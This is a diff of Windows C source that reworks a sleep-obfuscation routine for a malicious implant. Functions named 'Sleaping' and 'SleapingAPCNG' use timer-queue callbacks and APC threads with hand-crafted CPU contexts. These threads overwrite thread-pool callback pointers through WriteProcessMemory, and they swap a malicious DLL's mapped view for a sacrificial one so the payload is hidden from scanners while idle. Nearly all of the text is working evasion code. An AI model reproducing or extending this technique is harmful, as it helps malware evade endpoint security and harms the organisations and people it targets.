@@ -5,249 +5,251 @@
 
 
 
-
 /*------------------------------------------------------------*/
 
+//size of CtxHide and CtxFix is 6, in total 12 threads are created for implmenting the timer callback spoofing tehcnique
+int SleapingAPCNG(PTPP_CLEANUP_GROUP_MEMBER* callbackinfo, PHANDLE EvntHide, PHANDLE DummyEvent, PHANDLE apcThreads, PCONTEXT CtxHide, PCONTEXT CtxFix, PDWORD64 ResumeThreadValue, PDWORD64 SafeCallback, PNT_FUNCTIONS ntFunctions, PFUNCTION_ADDRESSES fnAddr) {
 
-int SleapingAPC(PTPP_CLEANUP_GROUP_MEMBER* callbackinfo, PHANDLE EvntHide, PHANDLE EvntFix, PHANDLE apcThreads, PCONTEXT Ctx, PCONTEXT CtxInit, PCONTEXT CtxFix, PCONTEXT CtxInitFix, PDWORD64 ResumeThreadValue) {
-    //variables and logic for SLEAPING APC callback hiding
+
+    /* --------- HIDING --------- */
+    HANDLE hThreads[6];
     
-    //dummy event 
-    HANDLE hEvent = { 0 };
 
-    //APC threads
-    HANDLE   Thread = { 0 };
-    HANDLE   ThreadFix = { 0 };
-
-	//function pointers for APC threads
-    PVOID NtTestAlertAddress = NULL;
-    PVOID NtWaitForSingleObjectAddress = NULL;
-    PVOID NtContinueAddress = NULL;
-    PVOID MessageBoxAddress = NULL;
-    //safecallback
-    PDWORD64 SafeCallback = (PDWORD64)VirtualAlloc(NULL, sizeof(PVOID), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-
-
-	//handle to ntdll and user32
-    HMODULE hNtdll = { 0 };
-    HMODULE hUser32 = { 0 };
-
-    if (!(hNtdll = GetModuleHandleA("ntdll"))) {
-        return -1;
-    }
-    if (!(hUser32 = GetModuleHandleA("user32.dll"))) {
-        return -1;
-    }
-	//function pointers for thread contexts
-    NtTestAlertAddress = GetProcAddress(hNtdll, "NtTestAlert");
-    NtWaitForSingleObjectAddress = GetProcAddress(hNtdll, "NtWaitForSingleObject");
-    NtContinueAddress = GetProcAddress(hNtdll, "NtContinue");
-    MessageBoxAddress = GetProcAddress(hUser32, "MessageBoxA");
-    *SafeCallback = (DWORD64)MessageBoxAddress;
-
-	
-    if (NtTestAlertAddress == NULL || NtWaitForSingleObjectAddress == NULL || NtContinueAddress == NULL || MessageBoxAddress == NULL) {
-        return -1;
-    }
-    
-    
-	//NT functions
-    NtCreateEventFunc NtCreateEvent = (NtCreateEventFunc)GetProcAddress(hNtdll, "NtCreateEvent");
-    NtCreateThreadExFunc NtCreateThreadEx = (NtCreateThreadExFunc)GetProcAddress(hNtdll, "NtCreateThreadEx");
-    NtGetContextThreadFunc NtGetContextThread = (NtGetContextThreadFunc)GetProcAddress(hNtdll, "NtGetContextThread");
-    NtWaitForSingleObjectFunc NtWaitForSingleObject = (NtWaitForSingleObjectFunc)GetProcAddress(hNtdll, "NtWaitForSingleObject");
-    NtQueueApcThreadFunc NtQueueApcThread = (NtQueueApcThreadFunc)GetProcAddress(hNtdll, "NtQueueApcThread");
-    NtAlertResumeThreadFunc NtAlertResumeThread = (NtAlertResumeThreadFunc)GetProcAddress(hNtdll, "NtAlertResumeThread");
-
-
-    if (NtCreateThreadEx == NULL || NtGetContextThread == NULL || NtWaitForSingleObject == NULL || NtQueueApcThread == NULL || NtAlertResumeThread == NULL || NtCreateEvent == NULL) {
+    //starting the APC trigger thread
+    if (!NT_SUCCESS(ntFunctions->NtCreateThreadEx(&hThreads[0], THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (PUSER_THREAD_START_ROUTINE)ExitThread, NULL, TRUE, NULL, NULL, NULL, NULL)))
+    {
         return -1;
     }
 
-    /*-----------HIDING-------------*/
-
-
-    //i create a thread and i think that with this API and a NULL function address it gets created in suspended state (it does, still not alertable though)
-    if (!NT_SUCCESS(NtCreateThreadEx(&Thread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), NULL, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL))) {
+    CtxHide[0].ContextFlags = CONTEXT_ALL;
+    if (!NT_SUCCESS(ntFunctions->NtGetContextThread(hThreads[0], &CtxHide[0])))
+    {
         return -1;
     }
 
-    //i copy the context of the thread created 
-    (*CtxInit).ContextFlags = CONTEXT_FULL;
-    if (!NT_SUCCESS(NtGetContextThread(Thread, CtxInit))) {
+    *(ULONG_PTR*)((CtxHide[0]).Rsp) = (DWORD64)fnAddr->NtTestAlertAddress;
+    CtxHide[0].Rip = (DWORD64)WaitForSingleObjectEx;
+    CtxHide[0].Rcx = (DWORD64)(*EvntHide);
+    CtxHide[0].Rdx = (DWORD64)INFINITE;
+    CtxHide[0].R8 = FALSE;
+
+    // Set the modified context back to the thread
+    if (!NT_SUCCESS(ntFunctions->NtSetContextThread(hThreads[0], &CtxHide[0])))
+    {
         return -1;
     }
 
-    /* prepare ROP initializing all the context as the same thread that will be picked by the APC queue*/
-    for (int i = 0; i < 8; i++) {
-        custom_memcpy_classic(&Ctx[i], CtxInit, sizeof(CONTEXT));
-    }
-
-    
-    /*-------------FIXING--------------*/
-
-    //create dummy event for waiting without sleeping
-    if (!NT_SUCCESS(NtCreateEvent(&hEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE))) {
+    if (!NT_SUCCESS(ntFunctions->NtResumeThread(hThreads[0], NULL)))
+    {
         return -1;
     }
 
-    //i create a thread and i think that with this API and a NULL function address it gets created in suspended state (it does, still not alertable though)
-    if (!NT_SUCCESS(NtCreateThreadEx(&ThreadFix, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), NULL, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL))) {
-        return -1;
-    }
 
-    //i copy the context of the thread created 
-    (*CtxInitFix).ContextFlags = CONTEXT_FULL;
-    if (!NT_SUCCESS(NtGetContextThread(ThreadFix, CtxInitFix))) {
-        return -1;
-    }
-
-    /* prepare ROP initializing all the context as the same thread that will be picked by the APC queue*/
-    for (int i = 0; i < 8; i++) {
-        custom_memcpy_classic(&CtxFix[i], CtxInitFix, sizeof(CONTEXT));
-    }
-
-
-	
-    /*-----------HIDING THREADS-------------*/
-   
-    //first thread just waiting for the event to be set
-    *(ULONG_PTR*)((Ctx[0]).Rsp) = (DWORD64)NtTestAlertAddress;
-    Ctx[0].Rip = (DWORD64)NtWaitForSingleObjectAddress;
-    Ctx[0].Rcx = (DWORD64)(*EvntHide);
-    Ctx[0].Rdx = FALSE;
-    Ctx[0].R8 = NULL;
-
-    *(ULONG_PTR*)((Ctx[1]).Rsp) = (DWORD64)NtTestAlertAddress;
-    Ctx[1].Rip = (DWORD64)WriteProcessMemory;
-    Ctx[1].Rcx = (DWORD64)(HANDLE)-1;
-    Ctx[1].Rdx = (DWORD64) & (callbackinfo[0]->FinalizationCallback);
-    Ctx[1].R8 = (DWORD64)SafeCallback;
-    Ctx[1].R9 = (DWORD64)sizeof(PVOID);
-
-    
-    *(ULONG_PTR*)((Ctx[2]).Rsp) = (DWORD64)NtTestAlertAddress;
-    Ctx[2].Rip = (DWORD64)WriteProcessMemory;
-    Ctx[2].Rcx = (DWORD64)(HANDLE)-1;
-    Ctx[2].Rdx = (DWORD64) & (callbackinfo[1]->FinalizationCallback);
-    Ctx[2].R8 = (DWORD64)SafeCallback;
-    Ctx[2].R9 = (DWORD64)sizeof(PVOID);
-
-    
-    *(ULONG_PTR*)((Ctx[3]).Rsp) = (DWORD64)NtTestAlertAddress;
-    Ctx[3].Rip = (DWORD64)WriteProcessMemory;
-    Ctx[3].Rcx = (DWORD64)(HANDLE)-1;
-    Ctx[3].Rdx = (DWORD64) & (callbackinfo[2]->FinalizationCallback);
-    Ctx[3].R8 = (DWORD64)SafeCallback;
-    Ctx[3].R9 = (DWORD64)sizeof(PVOID);
-
-    
-    *(ULONG_PTR*)((Ctx[4]).Rsp) = (DWORD64)NtTestAlertAddress;
-    Ctx[4].Rip = (DWORD64)WriteProcessMemory;
-    Ctx[4].Rcx = (DWORD64)(HANDLE)-1;
-    Ctx[4].Rdx = (DWORD64) & (callbackinfo[3]->FinalizationCallback);
-    Ctx[4].R8 = (DWORD64)SafeCallback;
-    Ctx[4].R9 = (DWORD64)sizeof(PVOID);
-
-    
-    *(ULONG_PTR*)((Ctx[5]).Rsp) = (DWORD64)NtTestAlertAddress;
-    Ctx[5].Rip = (DWORD64)WriteProcessMemory;
-    Ctx[5].Rcx = (DWORD64)(HANDLE)-1;
-    Ctx[5].Rdx = (DWORD64) & (callbackinfo[4]->FinalizationCallback);
-    Ctx[5].R8 = (DWORD64)SafeCallback;
-    Ctx[5].R9 = (DWORD64)sizeof(PVOID);
-
-	//set the event that would trigger the fixing callback thread
-    *(ULONG_PTR*)((Ctx[6]).Rsp) = (DWORD64)NtTestAlertAddress;
-    Ctx[6].Rip = (DWORD64)(SetEvent);
-    Ctx[6].Rcx = (DWORD64)(*EvntFix);
-
-    Ctx[7].Rip = (DWORD64)(ExitThread);
-    Ctx[7].Rcx = (DWORD64)0x00;
-
-    //always the same thread is queued but with a different context
-    //any thread has its own APC queue. After processing that APC, the thread will return to its previous state, typically exiting the alertable state unless it's put back into an alertable state explicitly
-    for (int i = 0; i < 8; i++) {
-        if (!NT_SUCCESS(NtQueueApcThread(Thread, (PPS_APC_ROUTINE)NtContinueAddress, &Ctx[i], FALSE, NULL))) {
+    // Create seven threads in suspended state
+    for (int i = 1; i < 6; ++i)
+    {
+        //does not really matter here the function the threads are going to execute
+        if (!NT_SUCCESS(ntFunctions->NtCreateThreadEx(&hThreads[i], THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (PUSER_THREAD_START_ROUTINE)ExitThread, NULL, TRUE, NULL, NULL, NULL, NULL)))
+        {
             return -1;
         }
     }
 
+    // Modify the context of all the threads
+    for (int i = 1; i < 6; ++i)
+    {
+        // Initialize the context structure
+        CtxHide[i].ContextFlags = CONTEXT_ALL;
+        if (!NT_SUCCESS(ntFunctions->NtGetContextThread(hThreads[i], &CtxHide[i])))
+        {
+            return -1;
+        }
 
-    // this is to put the thread in alertable state in fact starting to pick up tasks
-    if (!NT_SUCCESS(NtAlertResumeThread(Thread, NULL))) {
+    }
+
+
+    //starting APC threads here
+    *(ULONG_PTR*)((CtxHide[1]).Rsp) = (DWORD64)ExitThread;
+    CtxHide[1].Rip = (DWORD64)WriteProcessMemory;
+    CtxHide[1].Rcx = (DWORD64)(HANDLE)-1;
+    CtxHide[1].Rdx = (DWORD64) & (callbackinfo[0]->FinalizationCallback);
+    CtxHide[1].R8 = (DWORD64)SafeCallback;
+    CtxHide[1].R9 = (DWORD64)sizeof(PVOID);
+
+    *(ULONG_PTR*)((CtxHide[2]).Rsp) = (DWORD64)ExitThread;
+    CtxHide[2].Rip = (DWORD64)WriteProcessMemory;
+    CtxHide[2].Rcx = (DWORD64)(HANDLE)-1;
+    CtxHide[2].Rdx = (DWORD64) & (callbackinfo[1]->FinalizationCallback);
+    CtxHide[2].R8 = (DWORD64)SafeCallback;
+    CtxHide[2].R9 = (DWORD64)sizeof(PVOID);
+
+    *(ULONG_PTR*)((CtxHide[3]).Rsp) = (DWORD64)ExitThread;
+    CtxHide[3].Rip = (DWORD64)WriteProcessMemory;
+    CtxHide[3].Rcx = (DWORD64)(HANDLE)-1;
+    CtxHide[3].Rdx = (DWORD64) & (callbackinfo[2]->FinalizationCallback);
+    CtxHide[3].R8 = (DWORD64)SafeCallback;
+    CtxHide[3].R9 = (DWORD64)sizeof(PVOID);
+
+    *(ULONG_PTR*)((CtxHide[4]).Rsp) = (DWORD64)ExitThread;
+    CtxHide[4].Rip = (DWORD64)WriteProcessMemory;
+    CtxHide[4].Rcx = (DWORD64)(HANDLE)-1;
+    CtxHide[4].Rdx = (DWORD64) & (callbackinfo[3]->FinalizationCallback);
+    CtxHide[4].R8 = (DWORD64)SafeCallback;
+    CtxHide[4].R9 = (DWORD64)sizeof(PVOID);
+
+    *(ULONG_PTR*)((CtxHide[5]).Rsp) = (DWORD64)ExitThread;
+    CtxHide[5].Rip = (DWORD64)WriteProcessMemory;
+    CtxHide[5].Rcx = (DWORD64)(HANDLE)-1;
+    CtxHide[5].Rdx = (DWORD64) & (callbackinfo[4]->FinalizationCallback);
+    CtxHide[5].R8 = (DWORD64)SafeCallback;
+    CtxHide[5].R9 = (DWORD64)sizeof(PVOID);
+
+
+
+    // Set the new context to all the threads
+    for (int i = 1; i < 6; ++i)
+    {
+        // Initialize the context structure
+        if (!NT_SUCCESS(ntFunctions->NtSetContextThread(hThreads[i], &CtxHide[i])))
+        {
+            return -1;
+        }
+
+    }
+
+	//queue the APC threads to the worker thread
+	for (int i = 0; i < 5; i++) {
+		if (!NT_SUCCESS(ntFunctions->NtQueueApcThread(hThreads[0], (PPS_APC_ROUTINE)ResumeThread, hThreads[i + 1], FALSE, NULL))) {
+			return -1;
+		}
+	}
+    //queueing an extra APC for exiting the main thread
+	if (!NT_SUCCESS(ntFunctions->NtQueueApcThread(hThreads[0], (PPS_APC_ROUTINE)ExitThread, NULL, FALSE, NULL))) {
+		return -1;
+	}
+
+
+    /* --------- FIXING --------- */
+    HANDLE hThreadsFix[6];
+    
+    //starting the APC trigger thread
+    if (!NT_SUCCESS(ntFunctions->NtCreateThreadEx(&hThreadsFix[0], THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (PUSER_THREAD_START_ROUTINE)ExitThread, NULL, TRUE, NULL, NULL, NULL, NULL)))
+    {
         return -1;
     }
 
-    /*-----------FIXING THREADS-------------*/
+    CtxFix[0].ContextFlags = CONTEXT_ALL;
+    if (!NT_SUCCESS(ntFunctions->NtGetContextThread(hThreadsFix[0], &CtxFix[0])))
+    {
+        return -1;
+    }
 
-    //first thread just waiting for the event to be set
-    //this event will be set by the first APC threads
-    *(ULONG_PTR*)((CtxFix[0]).Rsp) = (DWORD64)NtTestAlertAddress;
-    CtxFix[0].Rip = (DWORD64)NtWaitForSingleObjectAddress;
-    CtxFix[0].Rcx = (DWORD64)(*EvntFix);
-    CtxFix[0].Rdx = FALSE;
-    CtxFix[0].R8 = NULL;
+    *(ULONG_PTR*)((CtxFix[0]).Rsp) = (DWORD64)fnAddr->NtTestAlertAddress;
+    CtxFix[0].Rip = (DWORD64)WaitForSingleObjectEx;
+    CtxFix[0].Rcx = (DWORD64)(*DummyEvent);
+    CtxFix[0].Rdx = (DWORD64)19000;
+    CtxFix[0].R8 = FALSE;
 
-    *(ULONG_PTR*)((CtxFix[1]).Rsp) = (DWORD64)NtTestAlertAddress;
-    CtxFix[1].Rip = (DWORD64)(WaitForSingleObject);
-    CtxFix[1].Rcx = (DWORD64)hEvent;
-	CtxFix[1].Rdx = (DWORD64)17000;
+    // Set the modified context back to the thread
+    if (!NT_SUCCESS(ntFunctions->NtSetContextThread(hThreadsFix[0], &CtxFix[0])))
+    {
+        return -1;
+    }
 
-    *(ULONG_PTR*)((CtxFix[2]).Rsp) = (DWORD64)NtTestAlertAddress;
+    if (!NT_SUCCESS(ntFunctions->NtResumeThread(hThreadsFix[0], NULL)))
+    {
+        return -1;
+    }
+
+	// Create seven threads in suspended state
+	for (int i = 1; i < 6; ++i)
+	{
+		//does not really matter here the function the threads are going to execute
+		if (!NT_SUCCESS(ntFunctions->NtCreateThreadEx(&hThreadsFix[i], THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (PUSER_THREAD_START_ROUTINE)ExitThread, NULL, TRUE, NULL, NULL, NULL, NULL)))
+		{
+			return -1;
+		}
+	}
+
+	// Modify the context of all the threads
+	for (int i = 1; i < 6; ++i)
+	{
+		// Initialize the context structure
+		CtxFix[i].ContextFlags = CONTEXT_ALL;
+		if (!NT_SUCCESS(ntFunctions->NtGetContextThread(hThreadsFix[i], &CtxFix[i])))
+		{
+			return -1;
+		}
+
+	}
+
+    *(ULONG_PTR*)((CtxFix[1]).Rsp) = (DWORD64)ExitThread;
+    CtxFix[1].Rip = (DWORD64)WriteProcessMemory;
+    CtxFix[1].Rcx = (DWORD64)(HANDLE)-1;
+    CtxFix[1].Rdx = (DWORD64) & (callbackinfo[0]->FinalizationCallback);
+    CtxFix[1].R8 = (DWORD64)ResumeThreadValue;
+    CtxFix[1].R9 = (DWORD64)sizeof(PVOID);
+
+    *(ULONG_PTR*)((CtxFix[2]).Rsp) = (DWORD64)ExitThread;
     CtxFix[2].Rip = (DWORD64)WriteProcessMemory;
     CtxFix[2].Rcx = (DWORD64)(HANDLE)-1;
-    CtxFix[2].Rdx = (DWORD64) & (callbackinfo[0]->FinalizationCallback);
+    CtxFix[2].Rdx = (DWORD64) & (callbackinfo[1]->FinalizationCallback);
     CtxFix[2].R8 = (DWORD64)ResumeThreadValue;
     CtxFix[2].R9 = (DWORD64)sizeof(PVOID);
 
-    *(ULONG_PTR*)((CtxFix[3]).Rsp) = (DWORD64)NtTestAlertAddress;
+    *(ULONG_PTR*)((CtxFix[3]).Rsp) = (DWORD64)ExitThread;
     CtxFix[3].Rip = (DWORD64)WriteProcessMemory;
     CtxFix[3].Rcx = (DWORD64)(HANDLE)-1;
-    CtxFix[3].Rdx = (DWORD64) & (callbackinfo[1]->FinalizationCallback);
+    CtxFix[3].Rdx = (DWORD64) & (callbackinfo[2]->FinalizationCallback);
     CtxFix[3].R8 = (DWORD64)ResumeThreadValue;
     CtxFix[3].R9 = (DWORD64)sizeof(PVOID);
 
-    *(ULONG_PTR*)((CtxFix[4]).Rsp) = (DWORD64)NtTestAlertAddress;
+    *(ULONG_PTR*)((CtxFix[4]).Rsp) = (DWORD64)ExitThread;
     CtxFix[4].Rip = (DWORD64)WriteProcessMemory;
     CtxFix[4].Rcx = (DWORD64)(HANDLE)-1;
-    CtxFix[4].Rdx = (DWORD64) & (callbackinfo[2]->FinalizationCallback);
+    CtxFix[4].Rdx = (DWORD64) & (callbackinfo[3]->FinalizationCallback);
     CtxFix[4].R8 = (DWORD64)ResumeThreadValue;
     CtxFix[4].R9 = (DWORD64)sizeof(PVOID);
 
-    *(ULONG_PTR*)((CtxFix[5]).Rsp) = (DWORD64)NtTestAlertAddress;
+    *(ULONG_PTR*)((CtxFix[5]).Rsp) = (DWORD64)ExitThread;
     CtxFix[5].Rip = (DWORD64)WriteProcessMemory;
     CtxFix[5].Rcx = (DWORD64)(HANDLE)-1;
-    CtxFix[5].Rdx = (DWORD64) & (callbackinfo[3]->FinalizationCallback);
+    CtxFix[5].Rdx = (DWORD64) & (callbackinfo[4]->FinalizationCallback);
     CtxFix[5].R8 = (DWORD64)ResumeThreadValue;
     CtxFix[5].R9 = (DWORD64)sizeof(PVOID);
 
-    *(ULONG_PTR*)((CtxFix[6]).Rsp) = (DWORD64)NtTestAlertAddress;
-    CtxFix[6].Rip = (DWORD64)WriteProcessMemory;
-    CtxFix[6].Rcx = (DWORD64)(HANDLE)-1;
-    CtxFix[6].Rdx = (DWORD64) & (callbackinfo[4]->FinalizationCallback);
-    CtxFix[6].R8 = (DWORD64)ResumeThreadValue;
-    CtxFix[6].R9 = (DWORD64)sizeof(PVOID);
 
-    CtxFix[7].Rip = (DWORD64)(ExitThread);
-    CtxFix[7].Rcx = (DWORD64)0x00;
 
-    for (int i = 0; i < 8; i++) {
-        if (!NT_SUCCESS(NtQueueApcThread(ThreadFix, (PPS_APC_ROUTINE)NtContinueAddress, &CtxFix[i], FALSE, NULL))) {
-            return -1;
-        }
-    }
+	// Set the new context to all the threads
+	for (int i = 1; i < 6; ++i)
+	{
+		// Initialize the context structure
+		if (!NT_SUCCESS(ntFunctions->NtSetContextThread(hThreadsFix[i], &CtxFix[i])))
+		{
+			return -1;
+		}
 
-    if (!NT_SUCCESS(NtAlertResumeThread(ThreadFix, NULL))) {
-        return -1;
-    }
+	}
 
-    /*-----------------------------------------*/
+	//queue the APC threads to the worker thread
+	for (int i = 0; i < 5; i++) {
+		if (!NT_SUCCESS(ntFunctions->NtQueueApcThread(hThreadsFix[0], (PPS_APC_ROUTINE)ResumeThread, hThreadsFix[i + 1], FALSE, NULL))) {
+			return -1;
+		}
+	}
 
-    apcThreads[0] = Thread;
-    apcThreads[1] = ThreadFix;
- 
-    return 0;
+	//queueing an extra APC for exiting the main thread
+	if (!NT_SUCCESS(ntFunctions->NtQueueApcThread(hThreadsFix[0], (PPS_APC_ROUTINE)ExitThread, NULL, FALSE, NULL))) {
+		return -1;
+	}
+
+	//for loop that adds both Thread and ThreadFix to the array of apcThreads
+	for (int i = 0; i < 6; i++) {
+		apcThreads[i] = hThreads[i];
+		apcThreads[i + 6] = hThreadsFix[i];
+	}
+
+	return 0;
 }
 
 
@@ -426,62 +428,49 @@ int EnumResumeThreadCallbacks(PVOID ResumeThreadAddress, PTPP_CLEANUP_GROUP_MEMB
 
 /*-----------------------------------------------------------*/
 
-int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_T viewSize) {
+int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_T viewSize, PNT_FUNCTIONS ntFunctions, PFUNCTION_ADDRESSES fnAddr) {
 
     //APC Threads
-    PHANDLE ApcThreads = (PHANDLE)(VirtualAlloc(NULL, 2 * sizeof(HANDLE), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
+    PHANDLE ApcThreads = (PHANDLE)(VirtualAlloc(NULL, 12 * sizeof(HANDLE), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
 
     //Context APC threads
-    CONTEXT* Ctx = (CONTEXT*)(VirtualAlloc(NULL, 8 * sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
-    CONTEXT* CtxInit = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
-
+    CONTEXT* CtxHide = (CONTEXT*)(VirtualAlloc(NULL, 6 * sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
 
     //context APC threads fix callback
-    CONTEXT* CtxFix = (CONTEXT*)(VirtualAlloc(NULL, 8 * sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
-    CONTEXT* CtxInitFix = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
-
+    CONTEXT* CtxFix = (CONTEXT*)(VirtualAlloc(NULL, 6 * sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
+    
     //events for APC threads
     HANDLE   EvntHide = { 0 };
-    HANDLE   EvntFix = { 0 };
+	HANDLE DummyEvent = { 0 };
 
     //support NT functions 
-    NTSTATUS Status = { 0 };
     HMODULE hNtdll = { 0 };
 
     //callbackArray for APC to spoof
     PTPP_CLEANUP_GROUP_MEMBER* callbackArray = (PTPP_CLEANUP_GROUP_MEMBER*)VirtualAlloc(NULL, 5 * sizeof(PTPP_CLEANUP_GROUP_MEMBER), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     PDWORD64 ResumeThreadValue = (PDWORD64)VirtualAlloc(NULL, sizeof(PVOID), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-
-	//sleaping threads = 5 + 2 APC threads
-    HANDLE ThreadArray[7] = { NULL };
-
-    //timers variables
-    HANDLE  hTimerQueue = NULL;
-    HANDLE  hNewTimer = NULL;
-    PVOID ResumeThreadAddress = NULL;
-
+    PDWORD64 SafeCallback = (PDWORD64)VirtualAlloc(NULL, sizeof(PVOID), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     //initializing callback array structs
     for (int i = 0; i < 5; i++) {
         callbackArray[i] = (PTPP_CLEANUP_GROUP_MEMBER)VirtualAlloc(NULL, sizeof(TPP_CLEANUP_GROUP_MEMBER), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     }
 
-    if (!(hNtdll = GetModuleHandleA("ntdll"))) {
-        return -1;
-    }
-    NtCreateEventFunc NtCreateEvent = (NtCreateEventFunc)GetProcAddress(hNtdll, "NtCreateEvent");
+	//sleaping threads = 5 Timers + 12 APC threads
+    HANDLE ThreadArray[17] = { NULL };
 
-	if (NtCreateEvent == NULL) {
-		return -1;
-	}   
+    //timers variables
+    HANDLE  hTimerQueue = NULL;
+    HANDLE  hNewTimer = NULL;
 
-    //i create the sync event that would trigger the first thread (triggered via timers that invoke SetEvent in 
-    //order to trigger eventually Event Fix
-    if (!NT_SUCCESS(Status = NtCreateEvent(&EvntHide, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE))) {
+    //i create the sync event that would trigger the first thread 
+    if (!NT_SUCCESS(ntFunctions->NtCreateEvent(&EvntHide, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE))) {
         return -1;
     }
-    if (!NT_SUCCESS(Status = NtCreateEvent(&EvntFix, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE))) {
+
+    if (!NT_SUCCESS(ntFunctions->NtCreateEvent(&DummyEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE))) {
         return -1;
     }
+    
 
     //variables and logic for SLEAPING timers
     CONTEXT* context = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
@@ -578,28 +567,29 @@ int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_
         return -1;
     }
     
-    ResumeThreadAddress = GetProcAddress(GetModuleHandleA("kernel32.dll"), "ResumeThread");
-    *ResumeThreadValue = (DWORD64)ResumeThreadAddress;
-    if (ResumeThreadAddress != NULL) {
-
+    //value to change for the spoofing with the TpWorkerFactory structure
+    *ResumeThreadValue = (DWORD64)fnAddr->ResumeThreadAddress;
+    *SafeCallback = (DWORD64)fnAddr->MessageBoxAddress;
+    
+    if (ResumeThreadValue != NULL && SafeCallback != NULL) {
         //these two need to be bit longer in order for the spoofing to work properly, needs more testing for a more precise waiting
-		//i need to wait to enumerate all the callbacks before unmapping the view
-        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[0], 1000, 0, WT_EXECUTEINTIMERTHREAD);//unamp
-        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[1], 1100, 0, WT_EXECUTEINTIMERTHREAD);//mapsac
-        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[4], 2000, 0, WT_EXECUTEINTIMERTHREAD);//hide callbacks
-        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[2], 20000, 0, WT_EXECUTEINTIMERTHREAD);//unmap
-        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[3], 20100, 0, WT_EXECUTEINTIMERTHREAD);//mapmal
-        
+        //i need to wait to enumerate all the callbacks before unmapping the view
+        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)fnAddr->ResumeThreadAddress, ThreadArray[0], 1000, 0, WT_EXECUTEINTIMERTHREAD);//unamp
+        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)fnAddr->ResumeThreadAddress, ThreadArray[1], 1100, 0, WT_EXECUTEINTIMERTHREAD);//mapsac
+        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)fnAddr->ResumeThreadAddress, ThreadArray[4], 2000, 0, WT_EXECUTEINTIMERTHREAD);//hide callbacks
+        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)fnAddr->ResumeThreadAddress, ThreadArray[2], 21000, 0, WT_EXECUTEINTIMERTHREAD);//unmap
+        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)fnAddr->ResumeThreadAddress, ThreadArray[3], 21100, 0, WT_EXECUTEINTIMERTHREAD);//mapmal
+
         //TpWorkerFactory objects enumerated successfully so callbackArray now contains the addresses to fix
-        if (EnumResumeThreadCallbacks(ResumeThreadAddress, callbackArray) == 0) {
+        if (EnumResumeThreadCallbacks(fnAddr->ResumeThreadAddress, callbackArray) == 0) {
             //i should run SleapingAPC here so that all those contexts are available
-            if (SleapingAPC(callbackArray, &EvntHide, &EvntFix, ApcThreads, Ctx, CtxInit, CtxFix, CtxInitFix, ResumeThreadValue) == 0) {
-                
+            if (SleapingAPCNG(callbackArray, &EvntHide, &DummyEvent, ApcThreads, CtxHide, CtxFix, ResumeThreadValue, SafeCallback, ntFunctions, fnAddr) == 0) {
+
                 int counter = 5;
-                for (int i = 0; i < 2; i++) {
+                for (int i = 0; i < 12; i++) {
 
                     //adding the newly created APC threads to the thread array to be waiting for
-                    ThreadArray[counter] = ApcThreads[i];//5
+                    ThreadArray[counter] = ApcThreads[i];//5 + 12
                     counter++;
 
                 }
@@ -607,16 +597,19 @@ int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_
             else {
                 return -1;
             }
-		}
-		else {
-			return -1;
-		}
-
-        
-        if (WaitForMultipleObjects(7, ThreadArray, TRUE, INFINITE) == WAIT_FAILED) {
+        }
+        else {
             return -1;
         }
+	}
+	else {
+		return -1;
+	}
+        
+    if (WaitForMultipleObjects(17, ThreadArray, TRUE, INFINITE) == WAIT_FAILED) {
+            return -1;
     }
+    
     //good morning
     if (DeleteTimerQueue(hTimerQueue) == 0) {
 
@@ -628,12 +621,19 @@ int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_
